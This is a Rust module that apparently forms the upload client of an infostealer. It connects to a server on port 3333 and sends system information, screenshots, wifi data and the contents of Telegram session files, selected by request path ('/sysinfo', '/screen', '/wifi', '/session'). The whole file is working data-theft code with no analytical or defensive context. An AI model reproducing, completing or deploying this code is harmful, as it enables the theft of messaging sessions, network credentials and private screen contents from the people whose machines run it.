pub mod client_md
{
	use std::net::{TcpStream};
	use std::io::{Read, Write};
	use std::io::Result;
	use std::fs;


	pub fn start(request_path: String) -> Result<()>
	{
		let api_host = "localhost";
		let api_port = 3333;
		let request_method = "GET";

		match TcpStream::connect(format!("{}:{}", api_host, api_port)) {
			Ok(mut stream) =>
			{
				let request = format!(
					"{} {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
					request_method, request_path, api_host
				);

				println!("successfully connected to server in port 3333");

				stream.write_all(request.as_bytes()).unwrap();
				
				if request_path == "/sysinfo".to_string()
					{ stream.write_all(crate::sysinfo::sysinfo_md::start().as_bytes()).unwrap(); }
				else if request_path == "/screen".to_string()
				{
					let buffer: Vec<u8> = crate::screen::screen_md::start().unwrap();
					stream.write_all(&buffer).unwrap();
				}
				else if request_path == "/wifi".to_string()
					{ stream.write_all(crate::wifi::wifi_md::start().as_bytes()).unwrap(); }
				else if request_path == "/session".to_string()
				{
					let files: Vec<String> = crate::session::telegram_md::start();

					for x in files.iter()
					{
						let metadata = fs::metadata(&x)?;

						if metadata.is_file() {
							let mut file = fs::File::open(x)?;
							let mut buffer = [0; 1024];

							loop {
								let bytes_read = file.read(&mut buffer)?;
								if bytes_read == 0 { break; }
								stream.write_all(&buffer[..bytes_read])?;
							}
						}
					}
				}
			},
			Err(e) => println!("Failed to connect: {}", e),
		}
		println!("terminated.");

		Ok(())
	}
}